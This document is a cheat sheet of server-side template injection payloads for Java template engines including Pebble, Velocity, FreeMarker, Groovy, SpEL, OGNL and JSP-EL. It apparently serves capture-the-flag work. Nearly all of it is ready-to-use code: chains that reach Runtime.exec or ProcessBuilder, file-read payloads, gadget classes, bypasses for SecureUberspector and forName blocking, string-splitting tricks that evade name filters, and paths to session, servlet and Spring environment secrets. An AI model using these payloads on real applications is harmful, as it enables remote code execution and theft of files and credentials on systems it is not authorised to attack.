# Java class-model deep reference — reach Runtime from any engine

The JVM-side escape: get a Class object → `forName`/`getMethod`/
`invoke` → `Runtime.exec` or file reads. Per-engine accessor
differences, plus the gadget classes that do it in one call.

---

## 1. The universal chain — from any object

```text
obj → .getClass() / .class          → java.lang.Class
    → .forName('X')                  → named class
    → .getMethod('m', argTypes)      → Method
    → .invoke(target, args)          → call
    → .getRuntime().exec(cmd)        → RCE for Runtime

alternative: obj → .getClass().getProtectionDomain()
              → .getClassLoader()    → load classes even when
                                       forName is gated
```

The engine-specific wrinkle: HOW you spell `.getClass()`.

| Engine | Class access |
|---|---|
| Pebble | `{{'a'.getClass()}}` `{{'a'.class}}` |
| Jinjava | `{{'a'.getClass()}}` |
| Velocity | `$x.class` `$x.getClass()` (SecureUberspector may block) |
| Freemarker | `${x.class}` `${x?api.getClass()}` — `?api` gated |
| Groovy | `${x.class}` `${x.getClass()}` |
| JSP-EL | `${''.class}` `${''.getClass()}` |
| Thymeleaf/SpEL | `*{T(java.lang.Runtime)...}` — direct static |
| OGNL | `%{@java.lang.Runtime@getRuntime()}` — `@` static |

---

## 2. The full Runtime-exec chains — per engine

### Pebble / Jinjava
```java
{{'a'.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}}
{{'a'.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke('a'.getClass().forName('java.lang.Runtime').getRuntime(),'id')}}
{{'a'.getClass().forName('java.lang.ProcessBuilder').getConstructor(''.getClass().forName('java.lang.String[]')).newInstance(['id'])}}
```

### Velocity
```velocity
$x.class.forName('java.lang.Runtime').getRuntime().exec('id')
$x.class.forName('java.lang.Runtime').getMethod('exec',$x.class.forName('java.lang.String')).invoke($x.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')
#set($e=$x.class.forName('java.lang.Runtime'))$e.getRuntime().exec('id')
```

### FreeMarker — `?new`/`?api` paths
```ftl
${"freemarker.template.utility.Execute"?new()("id")}
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}
${"x"?api.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke("x"?api.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(),"id")}
```

### Groovy
```groovy
${'id'.execute()}
${'id'.execute().text}
${Runtime.getRuntime().exec('id')}
${new File('/flag').text}
${['sh','-c','cat /flag'].execute().text}
${this.class.classLoader.loadClass('java.lang.Runtime')}
```

### SpEL / Thymeleaf
```java
*{T(java.lang.Runtime).getRuntime().exec('id')}
*{T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','cat /flag'})}
*{new java.lang.ProcessBuilder('sh','-c','id').start()}
*{T(org.apache.commons.io.IOUtils).toString(new java.io.FileInputStream('/flag'))}
```

### OGNL
```ognl
%{@java.lang.Runtime@getRuntime().exec('id')}
%{new java.lang.ProcessBuilder('id').start()}
%{@java.util.Scanner@T(java.lang.ClassLoader)}
%{#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}
%{@java.lang.Class@forName('java.lang.Runtime').getDeclaredMethod('exec',@java.lang.Class@forName('java.lang.String'))}
```

### JSP-EL
```java
${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
${pageContext.request.session.servletContext}
```

---

## 3. The file-read paths — no exec needed

### Pebble/Jinjava
```java
{{'a'.getClass().forName('java.util.Scanner').getConstructor('a'.getClass().forName('java.io.File')).newInstance('a'.getClass().forName('java.io.File').getConstructor(''.getClass()).newInstance('/flag')).next()}}
   -- ugly — try bound objects first
```

### Velocity
```velocity
#include('/flag')
#parse('/flag')
$x.class.forName('java.util.Scanner').getDeclaredConstructor($x.class.forName('java.io.File')).newInstance($x.class.forName('java.io.File').getDeclaredConstructor($x.class.forName('java.lang.String')).newInstance('/flag')).next()
```

### FreeMarker
```ftl
<#include "/flag">
<#import "/flag" as x>
${"freemarker.template.utility.ObjectConstructor"?new()("java.util.Scanner","/flag")}  -- Scanner(File) not String —
   needs File ctor — use include instead
```

### Groovy
```groovy
${new File('/flag').text}
${'/flag' as File}.text
${Files.readAllBytes(Paths.get('/flag'))}
${new String(Files.readAllBytes(Paths.get('/flag')))}
```

### SpEL
```java
*{new java.util.Scanner(new java.io.File('/flag')).next()}
*{new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag')))}
*{T(org.springframework.util.StreamUtils).copyToString(new java.io.FileInputStream('/flag'),T(java.nio.charset.Charset).defaultCharset())}
```

### JSP
```jsp
<%= new java.util.Scanner(new java.io.File("/flag")).useDelimiter("\\Z").next() %>
${''.getClass().forName('java.util.Scanner')...}
```

---

## 4. The gadget classes — bundled helpers that exec

```text
freemarker.template.utility.Execute       → "cmd" arg runs shell
freemarker.template.utility.ObjectConstructor → ctor-instantiate
freemarker.template.utility.JythonRuntime → python (if classpath)
org.apache.velocity.tools.ClassTool       → $class.inspect — reflection
org.apache.velocity.tools.RenderTool      → $render.eval — VTL eval
ognl.OgnlRuntime / @ognl.OgnlContext@      → member-access unlock
org.springframework.* gadget beans        → bound-beans exploit
javax.script.ScriptEngine                 → js-engine eval (nashorn era)
```

The Velocity Tools set — `$class`, `$render`, `$field`, `$link`,
`$esc`, `$math`, `$date`, `$context`, `$request`, `$response`,
`$session`, `$application` — each a bound gadget; `$class.inspect`
gives reflection even with `.class` blocked.

---

## 5. The SecureUberspector problem — when `.class` is gated

```velocity
$x.class          -- BLOCKED
$x.getClass()      -- BLOCKED (same property-resolution path)
```

Bypasses:

```velocity
$class.inspect($x)              -- ClassTool reaches the same Class
$class.inspect($x).type          -- Class object
$class.inspect($x).type.forName(...)
$field.in('java.lang.Runtime').getMethod(...)   -- FieldTool
$context.keys                                -- enumerate bound vars —
                                          find a bean with methods
```

Or bound-bean gadgets: the app may bind objects that expose
dangerous methods directly (`$request`, `$response`, custom
service beans) — enumerate `$context.keys` and inspect each bean
for exec/read methods.

---

## 6. The class-loader reach — when forName is blocked

```java
x.class.protectionDomain.classLoader.loadClass('java.lang.Runtime')
x.class.classLoader.loadClass('java.lang.Runtime')
${x.class.classLoader}                   -- exposes the loader
```

`ClassLoader.loadClass` vs `Class.forName` — the uber-spect may
block `forName` by name but miss the loader path.

---

## 7. The method-name evasion — reflection filtering

```java
// 'exec'/'forName' strings filtered → build via concat:
$x.class.forName('java.lang.'+'Runtime')
$x.class.forName('java.lang.Run'+'time')
// or charset-encoded:
$x.class.forName(new String(new byte[]{106,97,118,97,...}))
// via getDeclaredMethods enumeration — skip the name:
$x.class.methods[N].invoke(...)
```

Enumerate `getDeclaredMethods()`/`getMethods()` — calling by INDEX
not by name dodges name-filters.

---

## 8. Servlet-context objects — always-worth-checking

```java
${pageContext}                        -- JSP page context
${pageContext.request}
${pageContext.session}
${pageContext.servletContext}
${applicationScope}
${sessionScope}
${requestScope}
${param} ${paramValues} ${header} ${headerValues} ${cookie}
${initParam}
```

`applicationScope`/`sessionScope`/`param`/`header`/`cookie` maps —
bound secrets often sit in session attributes.

---

## 9. The Spring beans reach — when app context bound

```java
#{beans.flagBean.value}                 -- beans map in some ctx
*{beans.environment.getProperty('flag')}
*{T(org.springframework.web.context.support.WebApplicationContextUtils)
  .getWebApplicationContext(request.servletContext).getBean('x')}
```

Spring binds beans/environment — `environment.getProperty` reaches
all application.properties incl. secrets.
